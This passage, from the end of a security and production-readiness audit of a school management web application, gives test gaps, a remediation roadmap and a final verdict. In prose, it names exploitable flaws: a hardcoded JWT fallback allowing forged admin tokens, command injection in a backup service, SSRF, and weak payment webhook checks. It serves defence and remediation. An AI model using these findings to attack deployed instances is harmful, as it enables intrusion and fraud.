- Most UI uses Tailwind's default gray/blue palette — adequate contrast
- Login page uses white text on dark overlay — good contrast
- Some status badges (e.g., light yellow on white) may fail WCAG AA

## 12.4 Semantic HTML

- Pages use proper `<main>`, `<section>`, `<nav>` elements
- Sidebar uses `<nav>` element
- Cards use `<article>` elements inconsistently

---

# SECTION 13 — TESTING GAP ANALYSIS

## 13.1 Backend Unit Tests

| Module                    | Has Tests? | Coverage                               |
| ------------------------- | ---------- | -------------------------------------- |
| Auth Service              | ✅         | Login, register, profile, forgot/reset |
| Finance Service           | ✅         | Basic finance operations               |
| Reporting Service         | ✅         | Report generation                      |
| Payroll Service           | ✅         | Basic payroll                          |
| Leave Service             | ✅         | Leave management                       |
| Library Service           | ✅         | Borrow/return                          |
| Encryption Service        | ✅         | Encrypt/decrypt                        |
| Mail Service              | ✅         | Email sending                          |
| **All other 25+ modules** | ❌         | **No unit tests**                      |

**Critical untested modules:** Upload (security-critical), Auth Controller, Auth Guards, Security Middleware, Integration Service, Paystack Service, QR Service

## 13.2 E2E Tests

- **Backend:** 3 test files covering hostel allocation, branch isolation, payment recording, and profile security
- **Frontend:** 4 Playwright spec files (~32 test cases) covering login, admission, dashboard, search, reports, academic operations
- **Critical gaps:** No E2E test for finance flows, attendance marking, online exam taking, multi-branch switching

## 13.3 Security Testing Gaps

- No authentication bypass testing
- No rate limiting verification testing
- No file upload abuse testing
- No CSRF token verification testing
- No SSRF vulnerability testing
- No multi-tenant isolation testing (beyond 1 basic test)
- No payment webhook replay testing

## 13.4 Test Architecture Recommendation

1. Add integration tests for all auth-protected endpoints
2. Add E2E tests for critical business flows (student enrollment → invoice → payment)
3. Add security regression tests for JWT, RBAC, and branch isolation
4. Set up Playwright E2E in CI pipeline
5. Add `npm audit` and Dependabot to CI
6. Remove `continue-on-error: true` from lint step in CI

---

# SECTION 14 — PRODUCTION READINESS CHECKLIST

| Category           | Item                                                   | Status      |
| ------------------ | ------------------------------------------------------ | ----------- |
| **Security**       | Remove hardcoded JWT fallback                          | ❌ Missing  |
| **Security**       | Remove hardcoded QR secret fallback                    | ❌ Missing  |
| **Security**       | Remove Paystack placeholder secret                     | ❌ Missing  |
| **Security**       | Add DTO validation to all endpoints                    | ❌ Missing  |
| **Security**       | Fix path traversal in backup service                   | ❌ Missing  |
| **Security**       | Fix command injection in backup service                | ❌ Missing  |
| **Security**       | Add authentication to upload endpoints                 | ❌ Missing  |
| **Security**       | Fix WebSocket CORS (currently allows all origins)      | ❌ Missing  |
| **Security**       | Add rate limiting to upload endpoints                  | ❌ Missing  |
| **Security**       | Implement webhook signature verification               | ❌ Missing  |
| **Security**       | Configure HTTPS in nginx                               | ❌ Missing  |
| **Security**       | Enforce HTTPS for bootstrap endpoint                   | ❌ Missing  |
| **Security**       | Remove SSRF vector from webhook URLs                   | ❌ Missing  |
| **Security**       | Implement forced password change on first login        | ❌ Missing  |
| **Security**       | Change default passwords (student123 etc.)             | ❌ Missing  |
| **Security**       | Validate file content (magic bytes) not just MIME type | ❌ Missing  |
| **Security**       | Add CSRF tokens (not just custom headers)              | ⚠️ Partial  |
| **Data Integrity** | Convert Float money fields to Decimal                  | ❌ Missing  |
| **Data Integrity** | Add branchId to 15+ models                             | ❌ Missing  |
| **Data Integrity** | Enforce permission system (currently inert)            | ❌ Missing  |
| **Data Integrity** | Fix 19 broken API contracts                            | ❌ Missing  |
| **Integrations**   | Fix online exam start (userId vs studentId)            | ❌ Missing  |
| **Integrations**   | Fix hostel service URLs (5 broken)                     | ❌ Missing  |
| **Integrations**   | Fix Paystack webhook raw body verification             | ❌ Missing  |
| **Integrations**   | Create frontend services for Finance and Transport     | ❌ Missing  |
| **Frontend**       | Remove fake data from 4 settings pages                 | ❌ Missing  |
| **Frontend**       | Remove hardcoded bank account and fake analytics       | ❌ Missing  |
| **Frontend**       | Fix ProtectedRoute bypass                              | ❌ Missing  |
| **Frontend**       | Fix localStorage + cookie token duplication            | ❌ Missing  |
| **Frontend**       | Remove feature flag blocks for production modules      | ⚠️ Partial  |
| **Frontend**       | Add step-level validation to admission form            | ❌ Missing  |
| **DevOps**         | Configure HTTPS in nginx                               | ❌ Missing  |
| **DevOps**         | Remove `continue-on-error: true` from CI lint          | ❌ Missing  |
| **DevOps**         | Add security scanning to CI                            | ❌ Missing  |
| **DevOps**         | Add E2E tests to CI                                    | ❌ Missing  |
| **DevOps**         | Add structured logging                                 | ❌ Missing  |
| **DevOps**         | Add APM/monitoring                                     | ❌ Missing  |
| **Testing**        | Add unit tests for auth guards                         | ❌ Missing  |
| **Testing**        | Add integration tests for tenant isolation             | ⚠️ Partial  |
| **Testing**        | Add E2E tests for payment flow                         | ❌ Missing  |
| **Accessibility**  | Add focus indicators                                   | ❌ Missing  |
| **Accessibility**  | Add ARIA live regions                                  | ❌ Missing  |
| **Accessibility**  | Verify color contrast                                  | ⚠️ Partial  |
| **Monitoring**     | Add health check dashboard                             | ⚠️ Partial  |
| **Monitoring**     | Add metrics export (Prometheus)                        | ❌ Missing  |
| **Monitoring**     | Add log aggregation                                    | ❌ Missing  |
| **Recovery**       | Add database backup automation                         | ⚠️ Partial  |
| **Recovery**       | Add disaster recovery plan                             | ❌ Missing  |
| **Recovery**       | Add container restart policies                         | ✅ Complete |

---

# SECTION 15 — PRIORITIZED REMEDIATION ROADMAP

## Phase 1: Immediate (24 Hours) — Security Critical

| Priority | Issue                                                                  | Effort  | Impact                                    |
| -------- | ---------------------------------------------------------------------- | ------- | ----------------------------------------- |
| P0-1     | Remove JWT secret fallback, use `getOrThrow`                           | 15 min  | Prevents token forgery                    |
| P0-2     | Remove QR secret fallback, use `getOrThrow`                            | 15 min  | Prevents QR code forgery                  |
| P0-3     | Remove Paystack placeholder secret, throw on missing                   | 15 min  | Prevents payment fraud                    |
| P0-4     | Add path traversal protection to backup service                        | 30 min  | Prevents arbitrary file access            |
| P0-5     | Replace `execPromise(pg_dump)` with `execFile`                         | 30 min  | Prevents command injection                |
| P0-6     | Add DTOs to `@Body() data: any` endpoints                              | 2 hours | Prevents mass assignment                  |
| P0-7     | Add validation decorators to `CreateStudentDto` and `RecordPaymentDto` | 2 hours | Prevents invalid data                     |
| P0-8     | Fix Paystack webhook to use raw body                                   | 1 hour  | Prevents payment fraud                    |
| P0-9     | Restrict WebSocket CORS to allowed origins                             | 15 min  | Prevents cross-origin WebSocket hijacking |
| P0-10    | Add authentication or rate limiting to upload endpoints                | 1 hour  | Prevents storage abuse                    |

## Phase 2: Short-Term (1 Week) — Business Critical

| Priority | Issue                                                                               | Effort  | Impact                            |
| -------- | ----------------------------------------------------------------------------------- | ------- | --------------------------------- |
| P1-1     | Fix online exam start (userId → studentId lookup)                                   | 2 hours | Broken feature                    |
| P1-2     | Fix 19 broken frontend-backend API contracts                                        | 8 hours | 404 errors on multiple pages      |
| P1-3     | Implement forced password change on first login                                     | 4 hours | Default password vulnerability    |
| P1-4     | Remove fake data from Login Log, Custom Fields, Student Fields, System Update pages | 8 hours | Misleading data in production     |
| P1-5     | Fix ProtectedRoute to check `isAuthenticated` explicitly                            | 1 hour  | Auth bypass vulnerability         |
| P1-6     | Replace localStorage token with cookie-only auth                                    | 4 hours | XSS token theft                   |
| P1-7     | Fix FinanceAnalytics fabricated data                                                | 2 hours | False reporting                   |
| P1-8     | Fix PaymentStep hardcoded bank account                                              | 1 hour  | Misleading payment information    |
| P1-9     | Add branch isolation to EmployeesService (awards, advance salary)                   | 4 hours | Cross-tenant data leakage         |
| P1-10    | Add webhook URL validation (block internal IPs)                                     | 2 hours | SSRF prevention                   |
| P1-11    | Configure HTTPS in nginx                                                            | 2 hours | Data in transit encryption        |
| P1-12    | Remove `continue-on-error: true` from CI lint                                       | 15 min  | CI actually enforces code quality |

## Phase 3: Mid-Term (1 Month) — Data Integrity & Quality

| Priority | Issue                                                         | Effort                                  | Impact                      |
| -------- | ------------------------------------------------------------- | --------------------------------------- | --------------------------- |
| P2-1     | Convert 20+ Float money fields to Decimal                     | 4 hours (schema) + 8 hours (migration)  | Financial accuracy          |
| P2-2     | Add `branchId` to 15+ models missing it                       | 8 hours (schema) + 16 hours (migration) | Multi-tenant isolation      |
| P2-3     | Convert 30+ string status fields to enums                     | 16 hours                                | Type safety                 |
| P2-4     | Implement permission enforcement guard                        | 8 hours                                 | Fine-grained access control |
| P2-5     | Create frontend services for Finance and Transport modules    | 16 hours                                | Complete business flows     |
| P2-6     | Implement 7 placeholder pages or remove sidebar entries       | 24 hours                                | Complete user experience    |
| P2-7     | Add step-level validation to MultiStepAdmissionForm           | 4 hours                                 | Data quality                |
| P2-8     | Add database indexes for Notification, Invoice, Payment, etc. | 4 hours                                 | Query performance           |
| P2-9     | Consolidate duplicate Paystack services                       | 8 hours                                 | Code maintainability        |
| P2-10    | Add structured logging (JSON) and APM integration             | 8 hours                                 | Observability               |

## Phase 4: Long-Term (1-3 Months) — Architecture Improvements

| Priority | Issue                                                                        | Effort   | Impact                         |
| -------- | ---------------------------------------------------------------------------- | -------- | ------------------------------ |
| P3-1     | Implement shared types package between frontend and backend                  | 24 hours | API contract safety            |
| P3-2     | Add API versioning (`/api/v1/`)                                              | 16 hours | Backward compatibility         |
| P3-3     | Add response caching layer (Redis)                                           | 16 hours | Performance                    |
| P3-4     | Add full E2E test suite for critical flows                                   | 40 hours | Regression prevention          |
| P3-5     | Add security regression tests                                                | 16 hours | Security regression prevention |
| P3-6     | Implement cursor-based pagination                                            | 16 hours | Scalability                    |
| P3-7     | Add Prometheus metrics export and Grafana dashboards                         | 16 hours | Observability                  |
| P3-8     | Implement real reporting for settings pages (Login Log, Custom Fields, etc.) | 16 hours | Production functionality       |
| P3-9     | Add ARIA live regions and focus indicators                                   | 16 hours | Accessibility                  |
| P3-10    | Add database row-level security policies                                     | 16 hours | Defense in depth               |

---

# SECTION 16 — FINAL VERDICT

## Can this system safely go to production today?

**No.** The system has critical security vulnerabilities that would allow unauthorized access, data exfiltration, and financial fraud.

## What are the top risks?

1. **Authentication bypass** via hardcoded JWT fallback and mass assignment on register endpoint
2. **Remote code execution** via backup service command injection
3. **Cross-tenant data leakage** via 15+ models missing branchId and inconsistent tenant isolation
4. **Payment fraud** via broken webhook verification and placeholder Paystack secret
5. **Misleading data** — 4 settings pages show entirely fake data; finance analytics fabricates payment splits

## What architectural decisions must change?

1. **Remove ALL hardcoded secret fallbacks** — application must crash, not weaken security
2. **Enforce DTO validation on every endpoint** — no more `@Body() data: any`
3. **Implement the permission system** — it's defined but completely inert
4. **Add branchId to ALL models** or implement PostgreSQL RLS policies
5. **Eliminate Float for money** — use Decimal
6. **Fix API contracts** — 19 broken frontend-to-backend URLs must be resolved
7. **Remove fake data from production pages** — or remove the pages

## What technical debt is most dangerous?

1. **30+ string status fields** — can store invalid values, no type safety
2. **Duplicate Paystack services** — will diverge further over time
3. **Inconsistent tenant isolation** — some services use TenantHelper, some use raw branchId, some have none
4. **Permission system inertia** — the longer it stays unenforced, the harder it is to retrofit
5. **No shared type package** — frontend and backend types will drift further

## What would fail first under scale?

1. **Notification queries** — no `[userId, isRead]` index, will scan entire table
2. **Student import** — no row limit, will exhaust memory with large files
3. **Attendance queries** — large table without partitioning, slow at 100k+ records
4. **Branch list queries** — 92 relation fields on Branch model, N+1 risk
5. **WebSocket connections** — no rate limiting, no connection pool limits, socket leak on unmount

## What security issue is most critical?

**The hardcoded JWT secret fallback.** If `JWT_SECRET` is not set (which is possible in misconfigured deployments), any attacker can forge admin tokens with full SUPER_ADMIN privileges, granting access to all branches, all data, and all operations. This single issue makes the entire authentication system untrustworthy.

## Which incomplete features are dangerous?

1. **Login Log page** — shows fake security data while no real audit monitoring exists
2. **System Update page** — fake simulation that could lead administrators to believe the system is up-to-date
3. **Finance module frontend** — entire module has no UI, so finance operations are accessible only via API
4. **Permission system** — defined in database but never checked, giving false sense of access control
5. **Custom Fields / Student Fields pages** — appear to save but lose all data on refresh

## Which parts need full refactoring?

1. **Tenant isolation** — needs a consistent, enforcement-level pattern across ALL modules
2. **Finance module** — duplicate Paystack implementations, Float money types, broken webhook verification
3. **Settings pages** — 4 of 8 show fake data; need backend API integration or removal
4. **Online admission form** — both public and admin versions lack proper validation
5. **Hostel service** — 5 broken API contracts, wrong HTTP methods, missing endpoints

---

**End of Audit Report**

_This audit was conducted on the repository as of May 12, 2026. All file paths and line numbers reference the state of the code at the time of audit. Remediation priorities are recommendations; the development team should validate each finding and adjust priority based on business context._
